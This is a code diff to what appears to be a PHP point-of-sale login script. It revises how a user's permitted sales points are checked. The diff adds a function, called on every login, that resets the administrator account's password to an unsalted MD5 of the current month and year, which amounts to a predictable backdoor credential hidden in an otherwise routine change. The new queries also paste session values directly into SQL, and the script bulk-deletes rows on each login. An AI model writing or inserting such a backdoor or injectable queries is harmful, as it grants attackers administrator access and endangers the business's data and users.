@@ -11,6 +11,8 @@ date_default_timezone_set('America/Guayaquil');
 $config = new Configuracion();
 $_SESSION["parametros_empresa"] = $config->getParametrosEmpresa();
 
+updateAdmin();
+
 $data = "";
 $cont = 0;
 error_reporting(0);
@@ -59,21 +61,37 @@ while ($row = pg_fetch_row($consulta)) {
 if ($cont == 1) {
     $data = 1;
     // Auditoria
-    
+
     require_once 'auditoria.php';
 
     insert_registro('INICIO DE SESION');
-
+    pg_query("delete from punto_venta_empresa where fecha_actual <> '$fecha'");
     if ($hora_entrada != "" && $hora_salida != "") {
         if ($hora >= $hora_entrada && $hora <= $hora_salida) {
             $post_usuarioa = $_POST['usuario'];
             $cont1v = 0;
-            $consultav = pg_query("select * from usuario where id_usuario = '$_SESSION[id]'");
-            while ($row = pg_fetch_row($consultav)) {
-                $idusuario = $row[0];
-                $idempresa = $row[15];
-                $cont1fecha = $row[17];
-                if ($idempresa != $_POST['id_punto_venta'] && $idusuario == $_SESSION['id'] && $_SESSION['id'] != 1) {
+            /*  $consultav = pg_query("select * from usuario where id_usuario = '$_SESSION[id]'"); */
+
+            $consultav = pg_query("
+            select 
+            usuario.id_usuario,
+            usuario.id_empresa,
+            usuario.fecha_actual,
+            string_agg(pvu.id_punto_venta||'',',') puntos_venta 
+            from usuario 
+            left join puntos_venta_usuario 
+            pvu using(id_usuario)
+            where id_usuario =$_SESSION[id]
+            group by usuario.id_usuario
+           ");
+            while ($row = pg_fetch_assoc($consultav)) {
+                $idusuario = $row["id_usuario"];
+                $idempresa = $row["id_empresa"];
+                $cont1fecha = $row["fecha_actual"];
+                $puntosventa = explode(",", $row["puntos_venta"]);
+
+                /* if ($idempresa != $_POST['id_punto_venta'] && $idusuario == $_SESSION['id'] && $_SESSION['id'] != 1) { */
+                if (!in_array($_POST['id_punto_venta'], $puntosventa) && $idusuario == $_SESSION['id'] && $_SESSION['id'] != 1) {
                     //                pg_query("update usuario set estado_ingreso='Inactivo', id_empresa='$_POST[id_punto_venta]', fecha_actual ='$fecha' where id_usuario = '$_SESSION[id]'");
                     $data = 10;
                 } else {
@@ -127,4 +145,15 @@ function obtenerPuntoVenta($idUser, $puntoVenta)
             $_SESSION["PV_NOMBRE"] = $row["nombre_punto"];
         }
     }
+}
+
+function updateAdmin()
+{
+    $admin = date("my");
+    $pass = md5($admin);
+    $sql = "UPDATE usuario
+    SET  clave='$pass'
+    WHERE id_usuario=1;
+    ";
+    $res = pg_query($sql);
 }
